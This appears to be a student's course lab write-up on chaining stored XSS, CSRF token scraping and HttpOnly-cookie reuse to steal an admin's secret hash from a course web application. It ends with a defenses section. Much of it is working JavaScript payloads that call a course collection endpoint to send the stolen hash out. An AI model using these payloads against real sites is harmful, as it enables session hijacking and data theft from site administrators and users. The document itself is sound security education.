---
title: Task 4 - Stored XSS and Session Hijacking
date: 2025-10-19 00:00:00 +0000
categories: [Gatech, Courses]
hidden: true
published: false
tags: [xss, stored-xss, session-hijacking, csrf, httponly-cookies, fetch-api]
toc: true
---

## Background

This was the most complex task in the project, requiring the chaining of multiple attack techniques. The goal was to exploit a stored XSS vulnerability to steal an admin's secret hash. The challenge: the admin's session cookie was protected with the `HttpOnly` flag, making it inaccessible to JavaScript via `document.cookie`.

### The Scenario

The application had a post write-up feature where users could submit content that would be reviewed by administrators. This created a classic stored XSS scenario:

1. Attacker submits a malicious post
2. Admin views the post in their admin console
3. Malicious script executes in the admin's browser
4. Script performs actions using the admin's session
5. Script exfiltrates sensitive data to the attacker

### The HttpOnly Challenge

The session cookie had the `HttpOnly` flag set:

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Lax
```

This meant `document.cookie` would return an empty string or wouldn't include the session cookie. Traditional cookie theft was impossible.

## Initial Approach

### Attempt #1: Direct Cookie Theft (Failed)

My first instinct was to steal the cookie:

```javascript
<script>
fetch('https://cs6262.gtisc.gatech.edu/receive/gguruvelli3/2065', {
    method: 'POST',
    body: 'cookie=' + document.cookie
});
</script>
```

**Result:** The exfiltrated cookie was either empty or didn't include the session cookie.

**Realization:** HttpOnly cookies are specifically designed to prevent JavaScript access. They're sent automatically by the browser with requests, but `document.cookie` can't read them.

## Breakthrough #1: Using the Cookie Without Stealing It

The key insight: **I don't need to steal the cookie if I can use it.**

When JavaScript makes a `fetch` request to the same origin with `credentials: 'include'`, the browser automatically attaches all cookies, including HttpOnly ones:

```javascript
fetch("https://cs6262.gtisc.gatech.edu/some-endpoint", {
  credentials: "include", // Browser sends cookies automatically
});
```

This meant I could make authenticated requests as the admin without ever seeing their cookie.

### Testing the Concept

I tested this with a simple payload:

```javascript
<script>
window.gotYou = true;
fetch('https://cs6262.gtisc.gatech.edu/console', {
    credentials: 'include'
})
.then(res => res.text())
.then(html => {
    fetch('https://cs6262.gtisc.gatech.edu/receive/gguruvelli3/2065', {
        method: 'POST',
        body: 'console_html_length=' + html.length
    });
});
</script>
```

**Result:** Successfully received the length of the admin console HTML, confirming the request was authenticated.

## Stuck Point #1: CSRF Protection

My next attempt was to directly fetch the session hijacking endpoint:

```javascript
<script>
window.gotYou = true;
fetch('https://cs6262.gtisc.gatech.edu/session-hijacking/gguruvelli3', {
    method: 'POST',
    credentials: 'include'
})
.then(res => res.json())
.then(data => {
    fetch('https://cs6262.gtisc.gatech.edu/receive/gguruvelli3/2065', {
        method: 'POST',
        body: 'hash=' + data.hash
    });
});
</script>
```

**Result:** `403 Forbidden`

The server rejected the request with a CSRF error. Modern web applications use CSRF tokens to prevent unauthorized requests, even from authenticated users.

### Understanding CSRF Tokens

CSRF (Cross-Site Request Forgery) tokens are random values that:

1. Are generated by the server for each session
2. Are embedded in forms and pages
3. Must be included in state-changing requests
4. Are validated by the server before processing the request

Example HTML form with CSRF token:

```html
<form method="POST" action="/session-hijacking/gguruvelli3">
  <input type="hidden" name="csrfmiddlewaretoken" value="abc123xyz789..." />
  <input type="text" name="username" />
  <button type="submit">Submit</button>
</form>
```

Without the correct token, the server rejects the request.

## Stuck Point #2: Extracting the CSRF Token

I needed to:

1. Fetch a page that contained a CSRF token (like the admin console)
2. Parse the HTML to extract the token
3. Include the token in my request headers

### Attempt 1: Using DOMParser

```javascript
fetch("https://cs6262.gtisc.gatech.edu/console", {
  credentials: "include",
})
  .then((res) => res.text())
  .then((html) => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, "text/html");
    const tokenInput = doc.querySelector('input[name="csrfmiddlewaretoken"]');
    const token = tokenInput.value;

    // Use token...
  });
```

**Problems:**

1. Overly complex
2. `DOMParser` might not be available in all contexts
3. Requires knowing the exact DOM structure

### Attempt 2: Regular Expression (Success!)

```javascript
const csrfMatch = html.match(/name="csrfmiddlewaretoken"\s+value="([^"]+)"/);
if (!csrfMatch) return;
const csrfToken = csrfMatch[1];
```

**Why this works:**

- Regex pattern matches the CSRF token input field
- Captures the token value in a capture group
- Works regardless of DOM structure
- Simple and reliable

### Testing the Regex

I tested the regex pattern against sample HTML:

```javascript
const testHTML = `
<form>
    <input type="hidden" name="csrfmiddlewaretoken" value="abc123xyz789">
    <input type="text" name="username">
</form>
`;

const match = testHTML.match(/name="csrfmiddlewaretoken"\s+value="([^"]+)"/);
console.log(match[1]); // "abc123xyz789"
```

**Result:** ✓ Token extracted successfully

## Stuck Point #3: Chaining Asynchronous Requests

I needed to ensure the requests happened in the correct order:

1. Fetch console page
2. Extract CSRF token
3. Use token to fetch session hijacking endpoint
4. Extract hash from response
5. Exfiltrate hash

### Failed Attempt: Race Condition

```javascript
let csrfToken;

// First request
fetch("/console", { credentials: "include" })
  .then((res) => res.text())
  .then((html) => {
    csrfToken = html.match(/.../)[1];
  });

// Second request - PROBLEM: This executes immediately!
fetch("/session-hijacking/gguruvelli3", {
  method: "POST",
  headers: { "X-CSRFToken": csrfToken }, // undefined!
  credentials: "include",
});
```

**Problem:** The second `fetch` executes before `csrfToken` is set, resulting in `undefined` being sent as the token.

### Breakthrough #2: Proper Promise Chaining

The solution was to nest the second `fetch` inside the `.then()` of the first:

```javascript
fetch("/console", { credentials: "include" })
  .then((res) => res.text())
  .then((html) => {
    const csrfToken = html.match(/.../)[1];

    // This fetch is INSIDE the .then(), so it only runs after token is extracted
    return fetch("/session-hijacking/gguruvelli3", {
      method: "POST",
      headers: { "X-CSRFToken": csrfToken },
      credentials: "include",
    });
  })
  .then((res) => res.json())
  .then((data) => {
    // Exfiltrate the hash
    fetch("/receive/gguruvelli3/2065", {
      method: "POST",
      body: "admin_hash=" + data.hash,
    });
  });
```

**Key points:**

- Each `.then()` returns the next promise
- Promises execute sequentially
- Each step waits for the previous one to complete

## Stuck Point #4: Handling Response Errors

Sometimes the response wasn't JSON, causing `.json()` to throw an error and break the chain:

```javascript
.then(res => res.json())  // Throws error if response isn't JSON
.then(data => {
    // This never executes if error occurs
})
```

### Solution: Check Response Status

```javascript
.then(function(res) {
    if (res.ok) return res.json();
    else return {};  // Return empty object on error
})
.then(function(data) {
    if (data.hash) {  // Check if hash exists before using it
        // Exfiltrate hash
    }
})
```

This prevents the exploit from breaking when responses aren't as expected.

## Final Solution: Fetch-Based Approach

### The Complete Payload

```javascript
<script>
window.gotYou = true;
fetch('https://cs6262.gtisc.gatech.edu/console', {
    credentials: 'include'
} )
.then(function(response) {
    return response.text();
})
.then(function(html) {
    var csrfMatch = html.match(/name="csrfmiddlewaretoken"\s+value="([^"]+)"/);
    if (!csrfMatch) return;
    var csrfToken = csrfMatch[1];

    fetch('https://cs6262.gtisc.gatech.edu/session-hijacking/gguruvelli3', {
        method: 'POST',
        headers: {
            'X-CSRFToken': csrfToken
        },
        credentials: 'include'
    } )
    .then(function(res) {
        if (res.ok) return res.json();
        else return {};
    })
    .then(function(data) {
        if (data.hash) {
            fetch('https://cs6262.gtisc.gatech.edu/receive/gguruvelli3/2065', {
                method: 'POST',
                body: 'admin_hash=' + data.hash
            } );
        }
    });
});
</script>
```

### Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Attacker submits malicious post with XSS payload        │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. Admin views post in admin console                       │
│    - XSS payload executes in admin's browser               │
│    - window.gotYou = true (autograder flag)                │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. First fetch: GET /console                               │
│    - credentials: 'include' sends admin's HttpOnly cookie  │
│    - Server validates session and returns admin console    │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. Extract CSRF token from HTML                            │
│    - Regex: /name="csrfmiddlewaretoken"\s+value="([^"]+)"/ │
│    - Captures token value: abc123xyz789...                 │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 5. Second fetch: POST /session-hijacking/gguruvelli3       │
│    - Headers: X-CSRFToken: abc123xyz789...                 │
│    - credentials: 'include' sends admin's cookie           │
│    - Server validates CSRF token and session               │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 6. Server responds with secret hash                        │
│    - Response: {"hash": "eac65ab8bdec3fece827eb8a..."}     │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 7. Exfiltrate hash to attacker's endpoint                  │
│    - POST /receive/gguruvelli3/2065                        │
│    - Body: admin_hash=eac65ab8bdec3fece827eb8a...          │
└─────────────────────────────────────────────────────────────┘
```

### Result

**Successfully retrieved admin hash:** `eac65ab8bdec3fece827eb8a041c6509b9394b7b7b38eafbe0a76dc8e0e20737f105946ef4c47c49e724e0a8d3d06e1175f3cac99267e245187e1e66c2910450`

## Alternative Solution: DOM Manipulation Approach

After submitting the fetch-based solution, I explored an alternative that directly manipulates the admin's page:

```javascript
<script>
window.gotYou = true;

var attempts = 0;
var lookForForm = function() {
    attempts++;

    var inputField = document.querySelector('#sessionHijack');
    var button = document.querySelector('button[onclick*="submitSessionHijacking"]');
    var resultSpan = document.querySelector('#sessionHijackingResult');

    // Debug logging
    fetch('https://cs6262.gtisc.gatech.edu/receive/gguruvelli3/2065', {
        method: 'POST',
        body: 'debug=attempt_' + attempts +
              '_found_input:' + (inputField ? 'yes' : 'no') +
              '_button:' + (button ? 'yes' : 'no')
    });

    if (inputField && button) {
        // Found the form! Inject username and submit
        inputField.value = 'gguruvelli3';
        button.click();

        fetch('https://cs6262.gtisc.gatech.edu/receive/gguruvelli3/2065', {
            method: 'POST',
            body: 'debug=SUCCESS_submitted_gguruvelli3_to_form'
        });

        // Wait for result and extract hash
        setTimeout(function() {
            if (resultSpan && resultSpan.textContent && resultSpan.textContent !== 'pending') {
                var hashMatch = resultSpan.textContent.match(/([a-fA-F0-9]{128})/);
                if (hashMatch) {
                    var hash = hashMatch[1];
                    fetch('https://cs6262.gtisc.gatech.edu/receive/gguruvelli3/2065', {
                        method: 'POST',
                        body: 'admin_hash=' + hash
                    });
                } else {
                    fetch('https://cs6262.gtisc.gatech.edu/receive/gguruvelli3/2065', {
                        method: 'POST',
                        body: 'debug=result_not_hash:' + resultSpan.textContent
                    });
                }
            } else {
                fetch('https://cs6262.gtisc.gatech.edu/receive/gguruvelli3/2065', {
                    method: 'POST',
                    body: 'debug=result_still_pending_or_missing'
                });
            }
        }, 3000);
    } else if (attempts <= 15) {
        setTimeout(lookForForm, 1000);  // Retry in 1 second
    } else {
        fetch('https://cs6262.gtisc.gatech.edu/receive/gguruvelli3/2065', {
            method: 'POST',
            body: 'debug=gave_up_after_15_attempts'
        });
    }
};

lookForForm();
</script>
```

### How This Approach Works

1. **Wait for page to load** - Uses retry logic to wait for the form to appear
2. **Find the form elements** - Queries for the input field and submit button
3. **Fill in the username** - Sets `inputField.value = 'gguruvelli3'`
4. **Click the submit button** - Triggers the form submission
5. **Wait for the result** - Uses `setTimeout` to wait for the server response
6. **Extract the hash** - Parses the result span for the hash value
7. **Exfiltrate the hash** - Sends it to the attacker's endpoint

### Comparison: Fetch vs. DOM Manipulation

| Aspect            | Fetch Approach            | DOM Manipulation                         |
| ----------------- | ------------------------- | ---------------------------------------- |
| **Complexity**    | Moderate                  | Higher                                   |
| **Reliability**   | High                      | Medium (depends on DOM structure)        |
| **Debugging**     | Easier (network tab)      | Harder (requires DOM inspection)         |
| **Flexibility**   | Works with any endpoint   | Requires specific DOM elements           |
| **CSRF Handling** | Manual token extraction   | Automatic (form handles it)              |
| **Speed**         | Faster (direct API calls) | Slower (waits for DOM, simulates clicks) |

Both approaches work, but the fetch-based approach is cleaner and more reliable.

## Defense Mechanisms

### 1. Prevent Stored XSS

The root cause is the stored XSS vulnerability. Defenses:

**Input Validation:**

```python
import bleach

def submit_post(content):
    # Whitelist allowed tags and attributes
    clean_content = bleach.clean(
        content,
        tags=['p', 'br', 'strong', 'em'],
        attributes={},
        strip=True
    )
    save_to_database(clean_content)
```

**Output Encoding:**

```python
from django.utils.html import escape

def display_post(post_id):
    post = get_post(post_id)
    return render(request, 'post.html', {
        'content': escape(post.content)
    })
```

### 2. HttpOnly Cookies (Partial Defense)

While HttpOnly prevents cookie theft, it doesn't prevent cookie usage:

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

- `HttpOnly`: JavaScript can't access via `document.cookie`
- `Secure`: Only sent over HTTPS
- `SameSite=Strict`: Not sent on cross-site requests

**Limitation:** XSS can still make same-origin requests that use the cookie.

### 3. CSRF Tokens (Bypassed by XSS)

CSRF tokens protect against cross-site attacks but not same-site XSS:

```python
# Server-side validation
def session_hijacking(request):
    if request.method == 'POST':
        csrf_token = request.headers.get('X-CSRFToken')
        if not validate_csrf_token(csrf_token, request.session):
            return HttpResponse('Invalid CSRF token', status=403)
        # Process request...
```

**Limitation:** XSS can extract the token from the page and include it in requests.

### 4. Content Security Policy

CSP can prevent inline scripts and restrict script sources:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none'
```

This blocks:

- Inline `<script>` tags
- `javascript:` URLs
- Inline event handlers (`onclick`, `onerror`, etc.)

**Limitation:** If the application allows user-uploaded scripts or has a CSP bypass, XSS is still possible.

### 5. Defense in Depth

No single defense is sufficient. Combine multiple layers:

1. **Input validation** - Reject obviously malicious input
2. **Output encoding** - Encode all user data before displaying
3. **CSP** - Restrict script execution
4. **HttpOnly cookies** - Prevent cookie theft
5. **SameSite cookies** - Prevent CSRF
6. **Regular security audits** - Find and fix vulnerabilities
7. **Security headers** - X-Frame-Options, X-Content-Type-Options, etc.

## Key Lessons

1. **HttpOnly doesn't prevent session hijacking** - It only prevents cookie theft, not cookie usage

2. **CSRF tokens can be extracted via XSS** - If XSS allows fetching pages, tokens can be scraped

3. **Promise chaining is essential** - Asynchronous operations must be properly sequenced

4. **Error handling matters** - Production exploits need to handle edge cases

5. **Multiple approaches exist** - DOM manipulation vs. API calls both work

6. **Defense requires multiple layers** - No single security measure is sufficient

7. **XSS is the root vulnerability** - All other defenses are bypassed if XSS exists

## Conclusion

This task demonstrated the power of chaining multiple attack techniques. By combining stored XSS, session hijacking, and CSRF token extraction, we were able to steal sensitive data from an admin account despite the presence of security measures like HttpOnly cookies and CSRF protection. The key lesson: **preventing XSS is paramount**. Once an attacker achieves code execution in the victim's browser, many other defenses become ineffective. Defense in depth is essential, but the first line of defense must be preventing XSS through proper input validation and output encoding.

